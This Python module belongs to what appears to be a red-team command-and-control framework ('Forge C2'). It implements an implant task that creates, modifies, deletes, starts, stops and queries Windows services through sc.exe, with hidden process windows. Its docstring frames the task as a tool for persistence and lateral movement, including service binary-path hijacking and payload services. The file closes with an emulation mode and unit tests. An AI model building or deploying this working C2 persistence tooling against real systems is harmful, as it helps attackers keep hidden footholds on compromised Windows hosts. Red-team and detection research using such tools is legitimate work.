"""
Forge C2 — Service Management Task
=======================================
Windows service create/modify/delete/query operations.

Operations:
    • query    — List services or query specific service status
    • create   — Create a new service (persistence, lateral movement)
    • modify   — Change service config (binary path, start type, etc.)
    • delete   — Remove a service
    • start    — Start a service
    • stop     — Stop a service

Persistence techniques:
    • Service binary path hijack
    • Custom service with payload binary
    • Service DLL (svchost) registration

MITRE ATT&CK: T1543.003 — Create or Modify System Process: Windows Service
FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import asyncio
import logging
import platform
import time
from dataclasses import dataclass, field
from typing import Any

from forge_c2.tasks.base_task import (
    BaseTask, TaskResult, TaskStatus, register_task,
)

log = logging.getLogger("forge.c2.tasks.service")


# ══════════════════════════════════════════════════════════════════════
#  SERVICE DATA STRUCTURES
# ══════════════════════════════════════════════════════════════════════

@dataclass
class ServiceInfo:
    """Windows service information."""
    name: str
    display_name: str = ""
    status: str = "unknown"        # running, stopped, paused, etc.
    start_type: str = "auto"       # auto, manual, disabled, boot, system
    binary_path: str = ""
    service_type: str = "own"      # own, share, kernel, filesys
    account: str = "LocalSystem"
    description: str = ""
    pid: int = 0
    dependencies: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "display_name": self.display_name,
            "status": self.status,
            "start_type": self.start_type,
            "binary_path": self.binary_path,
            "service_type": self.service_type,
            "account": self.account,
            "description": self.description,
            "pid": self.pid,
        }


# Start type mapping for sc.exe
START_TYPE_MAP = {
    "auto": "auto",
    "manual": "demand",
    "disabled": "disabled",
    "boot": "boot",
    "system": "system",
    "delayed-auto": "delayed-auto",
}


# ══════════════════════════════════════════════════════════════════════
#  SERVICE ENGINE
# ══════════════════════════════════════════════════════════════════════

class ServiceEngine:
    """Cross-platform service management engine."""

    def __init__(self) -> None:
        self._is_windows = platform.system() == "Windows"

    async def query(
        self, service_name: str = "", filter_status: str = "",
    ) -> tuple[list[ServiceInfo], str]:
        """Query services. Returns (services, error)."""
        if self._is_windows:
            return await self._query_windows(service_name, filter_status)
        return await self._query_emulation(service_name)

    async def create(
        self,
        name: str,
        display_name: str,
        binary_path: str,
        start_type: str = "auto",
        account: str = "LocalSystem",
        description: str = "",
    ) -> tuple[bool, str]:
        """Create a new service. Returns (success, message)."""
        if self._is_windows:
            return await self._create_windows(
                name, display_name, binary_path, start_type, account, description,
            )
        return self._create_emulation(
            name, display_name, binary_path, start_type,
        )

    async def modify(
        self, name: str, **kwargs: Any,
    ) -> tuple[bool, str]:
        """Modify service configuration."""
        if self._is_windows:
            return await self._modify_windows(name, **kwargs)
        return (True, f"[EMULATION] Service '{name}' modified: {kwargs}")

    async def delete(self, name: str) -> tuple[bool, str]:
        """Delete a service."""
        if self._is_windows:
            return await self._delete_windows(name)
        return (True, f"[EMULATION] Service '{name}' deleted")

    async def start(self, name: str) -> tuple[bool, str]:
        """Start a service."""
        if self._is_windows:
            return await self._sc_command("start", name)
        return (True, f"[EMULATION] Service '{name}' started")

    async def stop(self, name: str) -> tuple[bool, str]:
        """Stop a service."""
        if self._is_windows:
            return await self._sc_command("stop", name)
        return (True, f"[EMULATION] Service '{name}' stopped")

    # ── Windows implementations ────────────────────────────────────

    async def _query_windows(
        self, service_name: str, filter_status: str,
    ) -> tuple[list[ServiceInfo], str]:
        """Query services on Windows via sc.exe or WMI."""
        services: list[ServiceInfo] = []

        if service_name:
            # Query specific service
            cmd = ["sc.exe", "qc", service_name]
        else:
            # List all services
            cmd = ["sc.exe", "query", "type=", "service", "state=", "all"]

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                **self._creation_flags(),
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=30.0,
            )

            output = stdout.decode(errors="replace")

            if service_name:
                # Parse single service config
                svc = self._parse_sc_qc(service_name, output)
                if svc:
                    services.append(svc)
            else:
                # Parse service list
                services = self._parse_sc_query(output)

            if filter_status:
                services = [s for s in services
                            if s.status.lower() == filter_status.lower()]

            return (services, "")

        except Exception as exc:
            return ([], str(exc))

    async def _create_windows(
        self,
        name: str,
        display_name: str,
        binary_path: str,
        start_type: str,
        account: str,
        description: str,
    ) -> tuple[bool, str]:
        """Create a Windows service via sc.exe."""
        sc_start = START_TYPE_MAP.get(start_type, "auto")

        cmd = [
            "sc.exe", "create", name,
            f"binPath={binary_path}",
            f"DisplayName={display_name}",
            f"start={sc_start}",
            f"obj={account}",
        ]

        success, output = await self._sc_command_raw(cmd)

        if success and description:
            await self._sc_command_raw([
                "sc.exe", "description", name, description,
            ])

        return (success, output)

    async def _modify_windows(
        self, name: str, **kwargs: Any,
    ) -> tuple[bool, str]:
        """Modify service via sc.exe config."""
        cmd = ["sc.exe", "config", name]

        if "binary_path" in kwargs:
            cmd.extend([f"binPath={kwargs['binary_path']}"])
        if "start_type" in kwargs:
            sc_start = START_TYPE_MAP.get(kwargs["start_type"], "auto")
            cmd.extend([f"start={sc_start}"])
        if "display_name" in kwargs:
            cmd.extend([f"DisplayName={kwargs['display_name']}"])
        if "account" in kwargs:
            cmd.extend([f"obj={kwargs['account']}"])

        return await self._sc_command_raw(cmd)

    async def _delete_windows(self, name: str) -> tuple[bool, str]:
        """Delete a Windows service."""
        return await self._sc_command("delete", name)

    async def _sc_command(self, action: str, name: str) -> tuple[bool, str]:
        return await self._sc_command_raw(["sc.exe", action, name])

    async def _sc_command_raw(self, cmd: list[str]) -> tuple[bool, str]:
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                **self._creation_flags(),
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=15.0,
            )

            output = stdout.decode(errors="replace")
            if stderr:
                output += stderr.decode(errors="replace")

            return (proc.returncode == 0, output)

        except Exception as exc:
            return (False, str(exc))

    @staticmethod
    def _parse_sc_query(output: str) -> list[ServiceInfo]:
        """Parse sc.exe query output into ServiceInfo objects."""
        services: list[ServiceInfo] = []
        current: dict[str, str] = {}

        for line in output.split("\n"):
            line = line.strip()
            if line.startswith("SERVICE_NAME:"):
                if current.get("name"):
                    services.append(ServiceInfo(
                        name=current.get("name", ""),
                        display_name=current.get("display", ""),
                        status=current.get("state", "unknown"),
                        pid=int(current.get("pid", "0") or "0"),
                    ))
                current = {"name": line.split(":", 1)[1].strip()}
            elif line.startswith("DISPLAY_NAME"):
                current["display"] = line.split(":", 1)[1].strip()
            elif line.startswith("STATE"):
                # Parse "STATE  : 4  RUNNING"
                parts = line.split()
                for part in parts:
                    if part in ("RUNNING", "STOPPED", "PAUSED", "START_PENDING",
                                "STOP_PENDING", "CONTINUE_PENDING", "PAUSE_PENDING"):
                        current["state"] = part.lower()
                        break
            elif line.startswith("PID"):
                current["pid"] = line.split(":", 1)[1].strip()

        if current.get("name"):
            services.append(ServiceInfo(
                name=current.get("name", ""),
                display_name=current.get("display", ""),
                status=current.get("state", "unknown"),
            ))

        return services

    @staticmethod
    def _parse_sc_qc(name: str, output: str) -> ServiceInfo | None:
        """Parse sc.exe qc output for a single service."""
        info = ServiceInfo(name=name)

        for line in output.split("\n"):
            line = line.strip()
            if "BINARY_PATH_NAME" in line:
                info.binary_path = line.split(":", 1)[1].strip()
            elif "DISPLAY_NAME" in line:
                info.display_name = line.split(":", 1)[1].strip()
            elif "START_TYPE" in line:
                parts = line.split()
                for part in parts:
                    if part in ("AUTO_START", "DEMAND_START", "DISABLED",
                                "BOOT_START", "SYSTEM_START"):
                        info.start_type = part.replace("_START", "").lower()
                        break
            elif "SERVICE_START_NAME" in line:
                info.account = line.split(":", 1)[1].strip()

        return info if info.binary_path or info.display_name else None

    @staticmethod
    def _creation_flags() -> dict[str, int]:
        if platform.system() == "Windows":
            return {"creationflags": 0x08000000}
        return {}

    # ── Emulation ──────────────────────────────────────────────────

    async def _query_emulation(
        self, service_name: str,
    ) -> tuple[list[ServiceInfo], str]:
        """Return emulated service data."""
        emulated = [
            ServiceInfo("Spooler", "Print Spooler", "running", "auto",
                         "C:\\Windows\\System32\\spoolsv.exe", pid=1234),
            ServiceInfo("WinDefend", "Windows Defender", "running", "auto",
                         "C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe", pid=2468),
            ServiceInfo("wuauserv", "Windows Update", "running", "manual",
                         "C:\\Windows\\System32\\svchost.exe -k netsvcs", pid=3692),
            ServiceInfo("BITS", "Background Intelligent Transfer", "stopped", "manual",
                         "C:\\Windows\\System32\\svchost.exe -k netsvcs"),
            ServiceInfo("RemoteRegistry", "Remote Registry", "stopped", "disabled",
                         "C:\\Windows\\System32\\regsvc.dll"),
        ]

        if service_name:
            emulated = [s for s in emulated if s.name.lower() == service_name.lower()]

        return (emulated, "")

    def _create_emulation(
        self, name: str, display_name: str, binary_path: str, start_type: str,
    ) -> tuple[bool, str]:
        msg = (
            f"[EMULATION] Service created:\n"
            f"  Name:         {name}\n"
            f"  Display:      {display_name}\n"
            f"  Binary:       {binary_path}\n"
            f"  Start Type:   {start_type}\n"
        )
        log.info(msg)
        return (True, msg)


# ══════════════════════════════════════════════════════════════════════
#  TASK CLASS
# ══════════════════════════════════════════════════════════════════════

@register_task
class ServiceTask(BaseTask):
    """Windows service create/modify/delete/query operations.

    Args (via kwargs):
        operation:     "query", "create", "modify", "delete", "start", "stop"
        service_name:  Service name (required for all except query-all)
        display_name:  Display name (for create)
        binary_path:   Service binary path (for create/modify)
        start_type:    auto, manual, disabled (for create/modify)
        account:       Service account (default LocalSystem)
        description:   Service description
        filter_status: Filter by status for query (running, stopped)

    MITRE ATT&CK: T1543.003 — Windows Service
    """

    TASK_TYPE = "service"
    DESCRIPTION = "Service create/modify/delete/query"
    OPSEC_RISK = "high"
    MITRE_ID = "T1543.003"

    async def execute(self) -> TaskResult:
        operation = self.args.get("operation", "query").lower()
        service_name = self.args.get("service_name", "")
        display_name = self.args.get("display_name", "")
        binary_path = self.args.get("binary_path", "")
        start_type = self.args.get("start_type", "auto")
        account = self.args.get("account", "LocalSystem")
        description = self.args.get("description", "")
        filter_status = self.args.get("filter_status", "")

        start = time.time()
        engine = ServiceEngine()

        try:
            if operation == "query":
                services, error = await engine.query(service_name, filter_status)
                if error:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=error, started_at=start, completed_at=time.time(),
                    )
                output = self._format_services(services)

            elif operation == "create":
                if not service_name or not binary_path:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error="create requires service_name and binary_path",
                        started_at=start, completed_at=time.time(),
                    )
                success, output = await engine.create(
                    service_name, display_name or service_name,
                    binary_path, start_type, account, description,
                )
                if not success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=output, started_at=start, completed_at=time.time(),
                    )

            elif operation == "modify":
                if not service_name:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error="modify requires service_name",
                        started_at=start, completed_at=time.time(),
                    )
                mod_kwargs: dict[str, Any] = {}
                if binary_path:
                    mod_kwargs["binary_path"] = binary_path
                if start_type:
                    mod_kwargs["start_type"] = start_type
                if display_name:
                    mod_kwargs["display_name"] = display_name
                if account:
                    mod_kwargs["account"] = account

                success, output = await engine.modify(service_name, **mod_kwargs)
                if not success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=output, started_at=start, completed_at=time.time(),
                    )

            elif operation == "delete":
                if not service_name:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error="delete requires service_name",
                        started_at=start, completed_at=time.time(),
                    )
                success, output = await engine.delete(service_name)
                if not success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=output, started_at=start, completed_at=time.time(),
                    )

            elif operation in ("start", "stop"):
                if not service_name:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=f"{operation} requires service_name",
                        started_at=start, completed_at=time.time(),
                    )
                func = engine.start if operation == "start" else engine.stop
                success, output = await func(service_name)
                if not success:
                    return TaskResult(
                        task_id=self.task_id, status=TaskStatus.FAILED,
                        error=output, started_at=start, completed_at=time.time(),
                    )

            else:
                return TaskResult(
                    task_id=self.task_id, status=TaskStatus.FAILED,
                    error=f"Unknown operation: {operation}",
                    started_at=start, completed_at=time.time(),
                )

            return TaskResult(
                task_id=self.task_id,
                status=TaskStatus.COMPLETED,
                output=output,
                started_at=start,
                completed_at=time.time(),
                metadata={
                    "operation": operation,
                    "service": service_name,
                    "mitre": self.MITRE_ID,
                },
            )

        except Exception as exc:
            return TaskResult(
                task_id=self.task_id, status=TaskStatus.FAILED,
                error=str(exc), started_at=start, completed_at=time.time(),
            )

    @staticmethod
    def _format_services(services: list[ServiceInfo]) -> str:
        if not services:
            return "No services found."

        lines = [f"Services ({len(services)}):\n"]
        lines.append(f"  {'NAME':30s} {'STATUS':12s} {'START':10s} {'BINARY PATH'}")
        lines.append(f"  {'─' * 90}")

        for svc in services:
            status_color = "●" if svc.status == "running" else "○"
            lines.append(
                f"  {svc.name:30s} {status_color} {svc.status:10s} "
                f"{svc.start_type:10s} {svc.binary_path[:40]}"
            )

        return "\n".join(lines)


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestServiceTask:
    """Tests for service management task."""

    def test_encode(self) -> None:
        task = ServiceTask(task_id="svc1", operation="query")
        encoded = task.encode()
        assert encoded["type"] == "service"

    def test_decode(self) -> None:
        data = {"task_id": "svc2", "type": "service",
                "args": {"operation": "query", "service_name": "Spooler"}}
        task = ServiceTask.decode(data)
        assert task.args["service_name"] == "Spooler"

    def test_invalid_operation(self) -> None:
        import asyncio
        task = ServiceTask(task_id="svc3", operation="bogus")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_create_missing_params(self) -> None:
        import asyncio
        task = ServiceTask(task_id="svc4", operation="create")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.FAILED

    def test_emulation_query(self) -> None:
        import asyncio
        task = ServiceTask(task_id="svc5", operation="query")
        result = asyncio.run(task.execute())
        assert result.status == TaskStatus.COMPLETED

    def test_service_info_to_dict(self) -> None:
        info = ServiceInfo(name="TestSvc", display_name="Test", status="running")
        d = info.to_dict()
        assert d["name"] == "TestSvc"
        assert d["status"] == "running"

    def test_format_services(self) -> None:
        svcs = [ServiceInfo(name="Svc1", status="running", start_type="auto", binary_path="c:\\test.exe")]
        output = ServiceTask._format_services(svcs)
        assert "Svc1" in output
